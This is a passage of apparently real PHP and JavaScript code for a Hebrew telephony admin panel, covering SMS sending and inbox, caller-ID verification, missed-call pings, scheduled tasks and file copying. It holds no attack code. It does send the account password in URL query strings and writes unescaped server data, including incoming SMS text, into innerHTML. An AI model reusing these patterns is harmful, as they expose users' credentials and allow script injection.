                        <div class="form-group"><label for="codeInput">קוד אימות:</label><input type="text" id="codeInput" required></div>
                        <button type="button" class="button" style="background-color:var(--success-color);" onclick="handleValidateCallerId()">אמת מספר</button>
                    </form>
                    <div id="callerId-result" class="message" style="display:none; margin-top:20px;"></div>
                </div>
                <div>
                    <h3>שינוי שימוש במספר משנה</h3>
                    <form id="secondary-did-form">
                        <div class="form-group">
                            <label for="secondary-did-select">בחר מספר משנה:</label>
                            <select id="secondary-did-select" name="secondaryDidId"></select>
                        </div>
                        <div class="form-group">
                            <label for="secondary-did-usage">שימוש חדש (לדוגמה: goto:/1/2 או sip:5):</label>
                            <input type="text" id="secondary-did-usage" name="newUsage" placeholder="לדוגמה: goto:/1/2">
                        </div>
                        <button type="button" class="button" onclick="handleSetSecondaryDidUsage()" style="background-color:var(--primary-color);">שמור שינוי</button>
                    </form>
                    <div id="secondary-did-result" class="message" style="display:none; margin-top:20px;"></div>
                </div>
            </div>
        </div>
        
        <div id="incomingSms" class="tab-content">
            <h3>הצגת SMS שהתקבלו</h3>
            <form id="sms-filter-form" class="details-grid">
                <div class="form-group"><label for="sms-start-date">מתאריך:</label><input type="datetime-local" id="sms-start-date"></div>
                <div class="form-group"><label for="sms-end-date">עד תאריך:</label><input type="datetime-local" id="sms-end-date"></div>
                <div class="form-group"><label for="sms-limit">מגבלת תוצאות:</label><input type="number" id="sms-limit" value="100" max="3000"></div>
                <div class="form-group"><button type="button" class="button" onclick="handleGetSms()" style="background-color:var(--primary-color);">הצג SMS</button></div>
            </form>
            <div id="sms-results-container"></div>
        </div>

        <div id="sms" class="tab-content">
            <div class="details-grid">
                <div>
                    <h3><i class="fa-solid fa-paper-plane"></i> שליחת SMS</h3>
                    <form id="send-sms-form">
                        <div class="form-group">
                            <label for="sms-from">זיהוי שולח (מספר או טקסט):</label>
                            <input type="text" id="sms-from" name="from">
                        </div>
                        <div class="form-group">
                            <label for="sms-phones">נמענים (הפרד עם : או tpl:ID):</label>
                            <textarea id="sms-phones" name="phones" rows="3"></textarea>
                        </div>
                        <div class="form-group">
                            <label for="sms-message">תוכן ההודעה:</label>
                            <textarea id="sms-message" name="message" rows="4"></textarea>
                        </div>
                        <div class="form-check">
                            <label><input type="checkbox" id="sms-flash" name="sendFlashMessage" value="1"> שלח כהודעת פלאש (הודעה קופצת)</label>
                        </div>
                        <button type="button" class="button" style="background-color:var(--primary-color);" onclick="handleSendSms()">שלח הודעה</button>
                    </form>
                    <div id="send-sms-result" style="margin-top:15px;"></div>

                    <h3 style="margin-top:20px;"><i class="fa-solid fa-check-circle"></i> בדיקת זיהוי לשליחת SMS</h3>
                    <form id="check-sms-callerid-form">
                        <div class="form-group">
                             <label for="check-sms-callerid-input">זיהוי לבדיקה:</label>
                             <input type="text" id="check-sms-callerid-input">
                        </div>
                        <button type="button" class="button" style="background-color:var(--info-color);" onclick="handleCheckSmsCallerId()">בדוק זיהוי</button>
                    </form>
                    <div id="check-sms-callerid-result" style="margin-top:15px;"></div>
                </div>
                <div>
                    <h3><i class="fa-solid fa-id-badge"></i> זיהויים מאושרים לשליחת SMS</h3>
                    <div id="approved-sms-ids-container"></div>
                    <h3 style="margin-top:20px;"><i class="fa-solid fa-receipt"></i> פירוט תנועות SMS</h3>
                    <button type="button" class="button" style="background-color:var(--info-color);" onclick="loadSmsTransactions()"><i class="fa fa-sync"></i> רענן פירוט</button>
                    <div id="sms-transactions-container" style="margin-top:15px; max-height: 400px; overflow-y: auto;"></div>
                </div>
            </div>
        </div>

        <div id="tzintukim" class="tab-content">
            <div class="details-grid">
                <div>
                    <h3>הפעלת צינתוק</h3>
                    <form id="run-tzintuk-form">
                        <div class="form-group">
                            <label>זיהוי יוצא:</label>
                            <div class="button-group">
                                <button type="button" class="button caller-id-option-btn" onclick="selectCallerIdOption(this, 'custom')">מספר זיהוי</button>
                                <button type="button" class="button caller-id-option-btn" onclick="selectCallerIdOption(this, 'rand')">RAND</button>
                            </div>
                            <div id="tz-callerId-input-container" style="display:none;">
                                <input type="text" id="tz-callerId-input" placeholder="הקש מספר זיהוי יוצא">
                            </div>
                        </div>

                        <div class="form-group"><label for="tz-timeout">זמן צינתוק (שניות):</label><input type="number" id="tz-timeout" name="TzintukTimeOut" value="9" max="16"></div>
                        
                        <div class="form-group">
                            <label for="tz-phones">מספרים / רשימה (לדוגמה: tpl:10, tzl:20):</label>
                            <textarea id="tz-phones" name="phones" rows="4"></textarea>
                            <input type="file" id="tz-file-input" style="display:none;" accept=".txt,.csv" onchange="handleTzintukFileUpload(event)">
                            <button type="button" class="button" style="background-color:var(--info-color); margin-top: 10px;" onclick="document.getElementById('tz-file-input').click()"><i class="fa-solid fa-upload"></i> העלה קובץ מספרים</button>
                        </div>
                        
                        <button type="button" class="button" onclick="handleRunTzintuk()" style="background-color: var(--primary-color);"><i class="fa-solid fa-play"></i> הפעל צינתוק</button>
                    </form>
                     <div id="tz-results-container" style="margin-top:20px;"></div>
                </div>
                 <div>
                    <h3>ניהול רשימות צינתוקים (חינמי)</h3>
                    <button type="button" class="button" onclick="loadTzintukLists()" style="background-color: var(--info-color);"><i class="fa fa-sync"></i> טען רשימות</button>
                    <div id="tz-lists-container" style="margin-top:20px;"></div>
                </div>
            </div>
        </div>

        <div id="tasks" class="tab-content">
            <h3>ניהול משימות מתוזמנות</h3>
            <div class="actions"><button class="button" style="background-color: var(--success-color);" onclick="openTaskModal()"><i class="fa-solid fa-plus"></i> צור משימה חדשה</button></div>
            <div id="taskListContainer"><p>טוען משימות...</p></div>
        </div>
        
        <div id="pirsumphone" class="tab-content">
            <h3>ניהול שירות פרסומפון</h3>
            <div id="pirsumphone-status-container"></div>
        </div>

        <div id="security" class="tab-content">
            <h3>אבטחת מערכת</h3>
            <div id="security-status-container"></div>
            <div id="security-actions-container" class="details-grid" style="margin-top:20px;"></div>
            <div id="security-results-container" style="margin-top:20px;"></div>
        </div>

    <?php endif; ?>
</div>

<!-- All modals here -->
<div id="copy-modal" class="modal-overlay"> <div class="modal-content"> <span class="close-modal" onclick="closeCopyModal()">×</span> <h3>העתקת קבצים למערכת אחרת</h3> <p>הקבצים יועלו עם <strong>מספור אוטומטי</strong> לשלוחה שתבחר.</p> <div class="form-group"><label for="dest-did-input">מספר מערכת יעד:</label><input type="text" id="dest-did-input" required></div> <div class="form-group"><label for="dest-pass-input">סיסמת יעד:</label><input type="password" id="dest-pass-input" required></div> <div class="form-group"><label for="dest-extension-input">מספר שלוחה ביעד:</label><input type="text" id="dest-extension-input" placeholder="לדוגמה: 1 או 1/2" required></div> <button onclick="startCopyProcess()" class="button" style="background-color: var(--info-color);"><i class="fa-solid fa-rocket"></i> התחל העתקה</button> </div> </div>
<div id="task-modal" class="modal-overlay"> <div class="modal-content"> <span class="close-modal" onclick="closeTaskModal()">×</span> <h3 id="task-modal-title">יצירת משימה חדשה</h3> <form id="task-form" onsubmit="handleTaskFormSubmit(event)"> <input type="hidden" name="TaskId" id="TaskId"> <div class="form-group"><label for="task-description">תיאור המשימה</label><input type="text" id="task-description" name="description" required></div> <div class="form-group"> <label for="task-type">סוג המשימה</label> <select id="task-type" name="taskType" onchange="toggleTaskFields()" required> <option value="">בחר סוג...</option><option value="SendSMS">שליחת SMS</option><option value="RunTzintuk">הרצת צנתוק</option><option value="MoveOnFile">העברת קבצים</option> </select> </div> <div id="task-fields-container"> <div class="task-type-fields" data-type="SendSMS" style="display:none;"><div class="form-group"><label>מזהה/שם רשימת תפוצה</label><input type="text" name="smsList"></div><div class="form-group"><label>זיהוי יוצא</label><input type="text" name="callerId"></div><div class="form-group"><label>תוכן ההודעה</label><input type="text" name="smsMessage"></div></div> <div class="task-type-fields" data-type="RunTzintuk" style="display:none;"><div class="form-group"><label>מזהה/שם רשימה</label><input type="text" name="toList"></div><div class="form-group"><label>סוג רשימה</label><select name="typeList"><option value="tpl">tpl</option><option value="tzl">tzl</option></select></div><div class="form-group"><label>זיהוי יוצא</label><input type="text" name="callerId"></div></div> <div class="task-type-fields" data-type="MoveOnFile" style="display:none;"><div class="form-group"><label>תיקיית מקור</label><input type="text" name="folder"></div><div class="form-group"><label>תיקיית יעד</label><input type="text" name="target"></div><div class="form-group"><label>סוג קובץ להעברה</label><select name="moveFileType"><option value="maxFile">maxFile</option><option value="minFile">minFile</option></select></div><div class="form-group"><label>חסימת העברה אם קיים קובץ חדש ביעד (דקות)</label><input type="number" name="blockMoveIfNewFileInMinutes"></div></div> </div> <h3>תזמון</h3> <div class="details-grid"><div class="form-group"><label>דקה (0-59)</label><input type="number" name="minute" min="0" max="59"></div><div class="form-group"><label>שעה (0-23)</label><input type="number" name="hour" min="0" max="23"></div><div class="form-group"><label>יום בחודש (1-31)</label><input type="number" name="day" min="1" max="31"></div><div class="form-group"><label>חודש (1-12)</label><input type="number" name="month" min="1" max="12"></div><div class="form-group"><label>שנה</label><input type="number" name="year" min="<?php echo date('Y'); ?>"></div></div> <p style="text-align:center; font-size:0.9em;">השאר שדות ריקים כדי להתעלם מהם.</p> <label>ימי הרצה בשבוע</label> <div class="day-selector"><label>א<input type="checkbox" name="days" value="0"></label><label>ב<input type="checkbox" name="days" value="1"></label><label>ג<input type="checkbox" name="days" value="2"></label><label>ד<input type="checkbox" name="days" value="3"></label><label>ה<input type="checkbox" name="days" value="4"></label><label>ו<input type="checkbox" name="days" value="5"></label><label>ש<input type="checkbox" name="days" value="6"></label></div> <div class="form-check"><label><input type="checkbox" name="ifAnyDay" value="1"> התעלם מימים נבחרים והרץ בכל יום</label></div> <h3>אפשרויות</h3> <div class="details-grid"><div class="form-check"><label><input type="checkbox" name="active" value="1" checked> משימה פעילה</label></div><div class="form-check"><label><input type="checkbox" name="checkIsKodesh" value="1" checked> אל תריץ בשבת וחג</label></div><div class="form-check"><label><input type="checkbox" name="mailInEnd" value="1"> שלח מייל בסיום מוצלח</label></div><div class="form-check"><label><input type="checkbox" name="mailInError" value="1"> שלח מייל בכישלון</label></div></div> <button type="submit" id="task-submit-btn" class="button" style="background-color:var(--primary-color); margin-top: 20px;">שמור משימה</button> </form> </div> </div>
<div id="logs-modal" class="modal-overlay"><div class="modal-content"><span class="close-modal" onclick="document.getElementById('logs-modal').style.display='none'">×</span><h3 id="logs-modal-title">לוגים</h3><div id="logs-content"></div></div></div>

<script>
    <?php if ($session_data): ?>
    const did = <?php echo json_encode($did); ?>;
    const pass = <?php echo json_encode($pass); ?>;
    const delay = ms => new Promise(res => setTimeout(res, ms));
    <?php endif; ?>

    // --- Global Functions ---
    function openTab(evt, tabName) {
        let i, tabcontent, tablinks;
        tabcontent = document.getElementsByClassName("tab-content");
        for (i = 0; i < tabcontent.length; i++) { tabcontent[i].style.display = "none"; }
        tablinks = document.getElementsByClassName("tab-button");
        for (i = 0; i < tablinks.length; i++) { tablinks[i].className = tablinks[i].className.replace(" active", ""); }
        document.getElementById(tabName).style.display = "block";
        if(evt) evt.currentTarget.className += " active";
        <?php if ($session_data): ?>
        if (tabName === 'tasks') loadTasks();
        if (tabName === 'security') loadSecurityInfo();
        if (tabName === 'pirsumphone') loadPirsumphoneStatus();
        if (tabName === 'callerId') loadSecondaryDids();
        if (tabName === 'sms') { loadSmsTransactions(); loadApprovedSmsIds(); }
        if (tabName === 'units') loadUnitTransactions();
        if (tabName === 'callManager') loadActiveCalls();
        if (tabName === 'tzintukim') {
            loadTzintukLists();
            selectCallerIdOption(document.querySelector('.caller-id-option-btn[onclick*="\'custom\'"]'), 'custom');
        }
        <?php endif; ?>
    }

    document.addEventListener('DOMContentLoaded', function() {
        const activeTabId = <?php echo json_encode($active_tab_js); ?>;
        const activeTabButton = document.querySelector('.tab-button[onclick*="\'' + activeTabId + '\'"]');
        if (activeTabButton) activeTabButton.click();
        else if (document.querySelector('.tab-button')) document.querySelector('.tab-button').click();

        <?php if ($session_data): ?>
        const saCheck = document.getElementById('select-all-checkbox');
        const saBtn = document.getElementById('select-all-btn');
        const fChecks = document.querySelectorAll('#fileManager .file-checkbox');
        if (saCheck && saBtn) {
            saCheck.addEventListener('change', function() { fChecks.forEach(cb => { cb.checked = this.checked; }); });
            saBtn.addEventListener('click', function() {
                const isAnyUnchecked = Array.from(fChecks).some(cb => !cb.checked);
                fChecks.forEach(cb => { cb.checked = isAnyUnchecked; });
                saCheck.checked = isAnyUnchecked;
            });
        }
        <?php endif; ?>
    });

    <?php if ($session_data): ?>
    // --- File Manager Functions ---
    function showCopyModal() {
        if (document.querySelectorAll('#fileManager .file-checkbox:checked').length === 0) {
            alert('לא נבחרו קבצים להעתקה.'); return;
        }
        document.getElementById('copy-modal').style.display = 'flex';
    }
    function closeCopyModal() { document.getElementById('copy-modal').style.display = 'none'; }
    async function startCopyProcess() {
        const destDid = document.getElementById('dest-did-input').value;
        const destPass = document.getElementById('dest-pass-input').value;
        const destExtension = document.getElementById('dest-extension-input').value;
        if (!destDid || !destPass || !destExtension) { alert('יש למלא את כל הפרטים.'); return; }
        closeCopyModal();
        setUIWorking(true);
        const selectedCheckboxes = document.querySelectorAll('#fileManager .file-checkbox:checked');
        const totalFiles = selectedCheckboxes.length;
        let processedCount = 0, successCount = 0, errorCount = 0;
        for (const checkbox of selectedCheckboxes) {
            processedCount++;
            const filePath = checkbox.value; const fileName = filePath.substring(filePath.lastIndexOf('/') + 1);
            updateProgressUI(processedCount, totalFiles, `מעתיק את ${fileName}...`);
            const formData = new FormData();
            formData.append('js_action', 'copy_single_file');
            formData.append('did', did); formData.append('pass', pass);
            formData.append('dest_did', destDid); formData.append('dest_pass', destPass);
            formData.append('path', filePath); formData.append('dest_extension', destExtension);
            try {
                const response = await fetch(window.location.pathname, { method: 'POST', body: formData });
                const result = await response.json();
                if (!response.ok || !result.success) throw new Error(result.message || 'שגיאת שרת');
                successCount++;
            } catch (error) { errorCount++; console.error(`Failed to copy ${fileName}:`, error); }
            await delay(300);
        }
        let finalMessage = `הסתיימה פעולת ההעתקה לשלוחה ${destExtension}.\n`;
        finalMessage += `קבצים שהועתקו בהצלחה: ${successCount}\nקבצים שנכשלו: ${errorCount}`;
        if (errorCount > 0) finalMessage += `\nבדוק בחלון המפתחים (F12) לפרטים.`;
        alert(finalMessage);
        setUIWorking(false);
    }
    function setUIWorking(isWorking) {
        const pCont = document.getElementById('progress-container');
        document.querySelectorAll('.actions .buttons button').forEach(btn => btn.disabled = isWorking);
        pCont.style.display = isWorking ? 'block' : 'none';
        if (!isWorking) {
            updateProgressUI(0, 0, '');
            document.querySelectorAll('#fileManager .file-checkbox:checked').forEach(cb => cb.checked = false);
            if(document.getElementById('select-all-checkbox')) document.getElementById('select-all-checkbox').checked = false;
        }
    }
    function updateProgressUI(processed, total, text) {
        const bar = document.getElementById('progress-bar'), ptext = document.getElementById('progress-text');
        if (!bar || !ptext) return;
        const percentage = total > 0 ? Math.round((processed / total) * 100) : 0;
        bar.style.width = percentage + '%'; bar.innerText = percentage + '%';
        ptext.innerText = text || `מעבד קובץ ${processed} מתוך ${total}...`;
    }
    async function downloadCurrentFolder() {
        const allFileCheckboxes = document.querySelectorAll('#fileManager .file-checkbox');
        if (allFileCheckboxes.length === 0) { alert('אין קבצים להורדה בתיקייה זו.'); return; }
        if (!confirm(`האם להוריד את כל ${allFileCheckboxes.length} הקבצים מתיקייה זו?`)) return;
        allFileCheckboxes.forEach(checkbox => { checkbox.checked = true; });
        if(document.getElementById('select-all-checkbox')) document.getElementById('select-all-checkbox').checked = true;
        downloadSelectedFiles();
    }
    async function downloadSelectedFiles() {
        const selectedCheckboxes = document.querySelectorAll('#fileManager .file-checkbox:checked');
        if (selectedCheckboxes.length === 0) { alert('לא נבחרו קבצים להורדה.'); return; }
        setUIWorking(true);
        const totalFiles = selectedCheckboxes.length;
        let processedCount = 0; let hasError = false;
        for (const checkbox of selectedCheckboxes) {
            processedCount++;
            const filePath = checkbox.value; const fileName = filePath.substring(filePath.lastIndexOf('/') + 1);
            updateProgressUI(processedCount, totalFiles, `מוריד את ${fileName}...`);
            const downloadUrl = window.location.pathname + `?action=download_single_file&did=${encodeURIComponent(did)}&pass=${encodeURIComponent(pass)}&path=${encodeURIComponent(filePath)}`;
            try {
                const response = await fetch(downloadUrl);
                if (!response.ok) throw new Error(`שגיאת HTTP ${response.status}`);
                const blob = await response.blob();
                const link = document.createElement('a');
                link.href = URL.createObjectURL(blob); link.download = fileName;
                document.body.appendChild(link); link.click();
                document.body.removeChild(link); URL.revokeObjectURL(link.href);
            } catch (error) { hasError = true; console.error('Download failed for:', fileName, error); }
            await delay(500);
        }
        await delay(1000);
        let finalMessage = `הסתיים ניסיון ההורדה של ${totalFiles} קבצים.`;
        if (hasError) finalMessage += "\nיתכנו שגיאות בחלק מהקבצים. בדוק בחלון המפתחים (F12).";
        alert(finalMessage);
        setUIWorking(false);
    }
    
    // --- Universal API Call Function ---
    async function apiCall(action, params = {}, method = 'GET') {
        const urlParams = new URLSearchParams();
        urlParams.append('js_action', action);
        urlParams.append('did', did);
        urlParams.append('pass', pass);
        for (const key in params) {
            if (params.hasOwnProperty(key)) {
                urlParams.append(key, params[key]);
            }
        }
        try {
            const response = await fetch(window.location.pathname + '?' + urlParams.toString(), { method: method });
            if (!response.ok) {
                throw new Error(`שגיאת רשת ${response.status}`);
            }
            const text = await response.text();
            try {
                return JSON.parse(text);
            } catch (e) {
                console.error("Failed to parse JSON. Raw server response:", text);
                throw new Error(`תגובת השרת אינה בפורמט JSON תקין. ${e.message}`);
            }
        } catch (error) {
            console.error('API Call Error:', error);
            const targetContainerId = {
                'get_incoming_calls': 'active-calls-container',
                'get_tasks': 'taskListContainer'
            }[action] || null;

            const errorMessage = `שגיאה בטעינת הנתונים: ${error.message}`;
            if (targetContainerId && document.getElementById(targetContainerId)) {
                 document.getElementById(targetContainerId).innerHTML = `<p class="message error">${errorMessage}</p>`;
            } else {
                 alert(errorMessage);
            }
            return { responseStatus: 'ERROR', message: error.message };
        }
    }
    
    // --- Active Calls Manager Functions ---
    async function loadActiveCalls() {
        const container = document.getElementById('active-calls-container');
        container.innerHTML = '<p>טוען שיחות פעילות...</p>';
        const data = await apiCall('get_incoming_calls');

        if (data && data.responseStatus === 'OK') {
            if (!data.calls || data.calls.length === 0) {
                container.innerHTML = `<p>אין שיחות פעילות כרגע. (סה"כ ${data.callsCount || 0})</p>`;
                return;
            }
            let html = `<h4>סה"כ שיחות: ${data.callsCount}</h4>
                        <table>
                            <thead><tr><th>מספר מחויג (DID)</th><th>מחייג (CallerID)</th><th>משך (שניות)</th><th>הועבר מ</th><th>נתיב נוכחי</th><th>פעולות</th></tr></thead>
                            <tbody>`;
            data.calls.forEach(call => {
                html += `<tr>
                    <td data-label="מחויג">${call.did || ''}</td>
                    <td data-label="מחייג">${call.callerIdNum || ''}</td>
                    <td data-label="משך">${call.duration || ''}</td>
                    <td data-label="הועבר מ">${call.transferFrom || 'N/A'}</td>
                    <td data-label="נתיב">${call.path || ''}</td>
                    <td data-label="פעולות" class="task-actions">
                        <button class="button" style="background-color:var(--primary-color); padding: 5px 10px;" onclick="handleCallAction('${call.id}')" title="העבר או נתק שיחה"><i class="fa-solid fa-arrow-right-from-bracket"></i></button>
                    </td>
                </tr>`;
            });
            container.innerHTML = html + '</tbody></table>';
        } else if (data.responseStatus !== 'ERROR') { // Only show this if apiCall didn't already show an error
            container.innerHTML = `<p class="message error">שגיאה בטעינת השיחות: ${data.message || 'תקלה לא ידועה'}</p>`;
        }
    }
    window.loadActiveCalls = loadActiveCalls;

    async function handleCallAction(callId) {
        const destination = prompt('הזן את הנתיב להעברה (לדוגמה: /1/2) או הקלד "hangup" לניתוק השיחה.');
        if (destination === null || destination === "") {
            return; // User cancelled or entered nothing
        }

        const actionString = `set:GOasap=${destination}`;
        if (confirm(`האם אתה בטוח שברצונך לבצע את הפעולה הבאה על שיחה ${callId}?\n\n${actionString}`)) {
            const data = await apiCall('call_action', { id: callId, action: actionString });

            if (data && data.responseStatus === 'OK') {
                alert(`הפעולה בוצעה בהצלחה על ${data.callsCount || 0} שיחות.`);
                loadActiveCalls(); // Refresh the list
            } else {
                alert(`שגיאה בביצוע הפעולה: ${data.message || 'תקלה לא ידועה'}`);
            }
        }
    }
    window.handleCallAction = handleCallAction;

    // --- Units Tab Functions ---
    async function handleTransferUnits() {
        const resultDiv = document.getElementById('transfer-units-result');
        const destination = document.getElementById('transfer-dest').value;
        const amount = document.getElementById('transfer-amount').value;

        if (!destination || !amount || amount <= 0) {
            alert('יש למלא מערכת יעד וכמות חיובית להעברה.');
            return;
        }

        if (!confirm(`האם להעביר ${amount} יחידות למערכת ${destination}?`)) return;

        resultDiv.style.display = 'block';
        resultDiv.className = 'message';
        resultDiv.innerHTML = 'מבצע העברה...';

        const data = await apiCall('transfer_units', { destination, amount });

        if (data && data.responseStatus === 'OK') {
            resultDiv.className = 'message success';
            resultDiv.innerHTML = `ההעברה בוצעה בהצלחה! יתרה חדשה: ${data.newBalance}`;
            document.getElementById('units-balance-display').innerText = data.newBalance; // Update balance display
            loadUnitTransactions(); // Refresh transactions list
        } else {
            resultDiv.className = 'message error';
            resultDiv.innerHTML = `שגיאה בהעברה: ${data.message || 'תקלה לא ידועה'}`;
        }
    }
    async function loadUnitTransactions() {
        const container = document.getElementById('units-transactions-container');
        container.innerHTML = '<p>טוען תנועות...</p>';
        const data = await apiCall('get_transactions', { limit: 200 });
        if (data && data.responseStatus === 'OK') {
            if (!data.transactions || data.transactions.length === 0) {
                container.innerHTML = '<p>לא נמצאו תנועות יחידות.</p>';
                return;
            }
            let html = '<table><thead><tr><th>זמן</th><th>סכום</th><th>תיאור</th><th>בוצע ע"י</th><th>יתרה חדשה</th></tr></thead><tbody>';
            data.transactions.forEach(row => {
                html += `<tr>
                    <td data-label="זמן">${row.transactionTime}</td>
                    <td data-label="סכום">${row.amount}</td>
                    <td data-label="תיאור" style="word-break:break-all;">${row.description}</td>
                    <td data-label="בוצע ע'י">${row.who}</td>
                    <td data-label="יתרה חדשה">${row.newBalance}</td>
                </tr>`;
            });
            container.innerHTML = html + '</tbody></table>';
        } else {
            container.innerHTML = `<p class="message error">שגיאה בטעינת התנועות: ${data.message || 'תקלה לא ידועה'}</p>`;
        }
    }

    // --- Caller ID & Secondary DID Functions ---
    async function handleSendCallerId(){
        const callerId = document.getElementById('callerId-input').value;
        const validType = document.getElementById('callerId-type').value;
        const resultDiv = document.getElementById('callerId-result');
        if(!callerId) { alert('יש להזין מספר טלפון.'); return; }
        const data = await apiCall('validation_caller_id', {action: 'send', callerId, validType});
        if(data && data.responseStatus === 'OK'){
            resultDiv.className = 'message success';
            resultDiv.innerHTML = `קוד נשלח בהצלחה. מזהה הבקשה שלך הוא: <strong>${data.reqId}</strong>. אנא הזן אותו בשלב 2.`;
            document.getElementById('reqId-input').value = data.reqId;
        } else {
            resultDiv.className = 'message error';
            resultDiv.innerHTML = `שגיאה בשליחת הקוד: ${data.message || 'תקלה לא ידועה'}`;
        }
        resultDiv.style.display = 'block';
    }
    async function handleValidateCallerId(){
        const reqId = document.getElementById('reqId-input').value;
        const code = document.getElementById('codeInput').value;
        const resultDiv = document.getElementById('callerId-result');
        if(!reqId || !code) { alert('יש להזין מזהה בקשה וקוד.'); return; }
        const data = await apiCall('validation_caller_id', {action: 'valid', reId: reqId, code});
        if(data && data.responseStatus === 'OK' && data.status){
            resultDiv.className = 'message success';
            resultDiv.innerHTML = `<strong>הצלחה!</strong> הזיהוי אומת ותקף לשנה.`;
        } else {
            resultDiv.className = 'message error';
            resultDiv.innerHTML = `שגיאה באימות: ${data.message || 'הקוד או מזהה הבקשה שגויים.'}`;
        }
        resultDiv.style.display = 'block';
    }
    async function loadSecondaryDids() {
        const select = document.getElementById('secondary-did-select');
        select.innerHTML = '<option>טוען מספרים...</option>';
        const data = await apiCall('GetApprovedCallerIDs');
        if (data && data.responseStatus === 'OK' && data.call.secondaryDids) {
            select.innerHTML = '';
            if (data.call.secondaryDids.length > 0) {
                data.call.secondaryDids.forEach(did => {
                    // NOTE: The API requires secondaryDidId (int), but this call only provides the number (string).
                    // This may not work as expected. We are using the number itself as the ID.
                    select.innerHTML += `<option value="${did}">${did}</option>`;
                });
            } else {
                select.innerHTML = '<option>לא נמצאו מספרים משניים</option>';
            }
        } else {
             select.innerHTML = '<option>שגיאה בטעינת מספרים</option>';
        }
    }
    async function handleSetSecondaryDidUsage() {
        const resultDiv = document.getElementById('secondary-did-result');
        const didId = document.getElementById('secondary-did-select').value;
        const newUsage = document.getElementById('secondary-did-usage').value;

        if (!didId || !newUsage) {
            alert('יש לבחור מספר ולהזין שימוש חדש.');
            return;
        }
        
        if (!newUsage.startsWith('goto:/') && !newUsage.startsWith('sip:')) {
            alert('השימוש חייב להתחיל ב- "goto:/" או "sip:"');
            return;
        }

        resultDiv.style.display = 'none';
        // Note: Sending the number itself as secondaryDidId as the API for IDs is not available here.
        const data = await apiCall('SetSecondaryDidUsageDescription', { secondaryDidId: didId, newUsage: newUsage });

        if (data && data.responseStatus === 'OK' && data.status) {
            resultDiv.className = 'message success';
            resultDiv.innerHTML = `השימוש עבור המספר ${didId} עודכן בהצלחה!`;
        } else {
            resultDiv.className = 'message error';
            resultDiv.innerHTML = `שגיאה בעדכון: ${data.message || 'תקלה לא ידועה. ודא שהשימוש תקין.'}`;
        }
        resultDiv.style.display = 'block';
    }


    // --- Incoming SMS Functions ---
    async function handleGetSms() {
        const container = document.getElementById('sms-results-container');
        container.innerHTML = '<p>טוען הודעות...</p>';
        const startDate = document.getElementById('sms-start-date').value.replace('T', ' ');
        const endDate = document.getElementById('sms-end-date').value.replace('T', ' ');
        const limit = document.getElementById('sms-limit').value;
        const params = { limit };
        if(startDate) params.startDate = startDate;
        if(endDate) params.endDate = endDate;
        const data = await apiCall('get_incoming_sms', params);
        if(data && data.responseStatus === 'OK'){
            if(!data.rows || data.rows.length === 0) { container.innerHTML = '<p>לא נמצאו הודעות SMS בטווח התאריכים שנבחר.</p>'; return; }
            let html = `<table><thead><tr><th>תאריך</th><th>שולח</th><th>נמען</th><th>הודעה</th></tr></thead><tbody>`;
            data.rows.forEach(sms => {
                html += `<tr>
                    <td data-label="תאריך">${sms.receive_date}</td>
                    <td data-label="שולח">${sms.source}</td>
                    <td data-label="נמען">${sms.destination}</td>
                    <td data-label="הודעה" style="word-break:break-all;">${sms.message}</td>
                </tr>`;
            });
            container.innerHTML = html + '</tbody></table>';
        } else {
            container.innerHTML = `<p class="message error">שגיאה בטעינת ההודעות: ${data.message || 'תקלה לא ידועה'}</p>`;
        }
    }

    // --- SMS Functions ---
    async function handleSendSms() {
        const container = document.getElementById('send-sms-result');
        container.innerHTML = '<p>שולח SMS...</p>';
        const params = {
            from: document.getElementById('sms-from').value,
            phones: document.getElementById('sms-phones').value,
            message: document.getElementById('sms-message').value,
            sendFlashMessage: document.getElementById('sms-flash').checked ? '1' : '0'
        };
        if (!params.phones || !params.message) {
            alert('יש למלא תוכן הודעה ונמענים.');
            container.innerHTML = '';
            return;
        }
        const data = await apiCall('send_sms', params);
        if (data && data.responseStatus === 'OK') {
            let html = `<div class="message success"><strong>ההודעה נשלחה בהצלחה!</strong><br>נשלחו ${data.sendCount} הודעות. עלות: ${data.Billing} יחידות.</div>`;
            if (data.errors && Object.keys(data.errors).length > 0) {
                html += `<h4>שגיאות:</h4><ul class="details-list" style="text-align: right;">`;
                for (const phone in data.errors) { html += `<li><strong>${phone}:</strong> ${data.errors[phone]}</li>`; }
                html += `</ul>`;
            }
            container.innerHTML = html;
        } else { container.innerHTML = `<p class="message error">שגיאה בשליחת ה-SMS: ${data.message || 'תקלה לא ידועה'}</p>`; }
    }
    async function loadSmsTransactions() {
        const container = document.getElementById('sms-transactions-container');
        container.innerHTML = '<p>טוען תנועות...</p>';
        const data = await apiCall('get_customer_sms_transactions');
        if (data && data.responseStatus === 'OK') {
            if (!data.rows || data.rows.length === 0) { container.innerHTML = '<p>לא נמצאו תנועות SMS.</p>'; return; }
            let html = '<table><thead><tr><th>זמן</th><th>סכום</th><th>תיאור</th><th>יתרה</th></tr></thead><tbody>';
            data.rows.forEach(row => {
                html += `<tr>
                    <td data-label="זמן">${row.transactionTime}</td>
                    <td data-label="סכום">${row.amount}</td>
                    <td data-label="תיאור" style="word-break:break-all;">${row.description}</td>
                    <td data-label="יתרה">${row.newBalance}</td>
                </tr>`;
            });
            container.innerHTML = html + '</tbody></table>';
        } else { container.innerHTML = `<p class="message error">שגיאה בטעינת התנועות: ${data.message || 'תקלה לא ידועה'}</p>`; }
    }
    async function loadApprovedSmsIds() {
        const container = document.getElementById('approved-sms-ids-container');
        container.innerHTML = '<p>טוען זיהויים...</p>';
        const data = await apiCall('GetApprovedCallerIDs');
        if (data && data.responseStatus === 'OK') {
            let html = '<ul class="details-list">';
            if (data.sms.smsId) {
                html += `<li><i class="fa fa-lock"></i> <span>זיהוי SMS נעול:</span> <strong>${data.sms.smsId}</strong><br><small>(ניתן לשלוח SMS רק מזיהוי זה)</small></li>`;
            } else {
                 html += `<li><i class="fa fa-mobile-alt"></i> <span>זיהוי SMS ראשי:</span> <strong>${data.call.mainDid}</strong></li>`;
                 if(data.call.secondaryDids && data.call.secondaryDids.length > 0) {
                     html += `<li><i class="fa fa-mobile-alt"></i> <span>מספרים משניים:</span> <strong>${data.call.secondaryDids.join(', ')}</strong></li>`;
                 }
                 if(data.call.callerIds && data.call.callerIds.length > 0) {
                     html += `<li><i class="fa fa-phone"></i> <span>זיהויים חיצוניים:</span> <strong>${data.call.callerIds.join(', ')}</strong></li>`;
                 }
            }
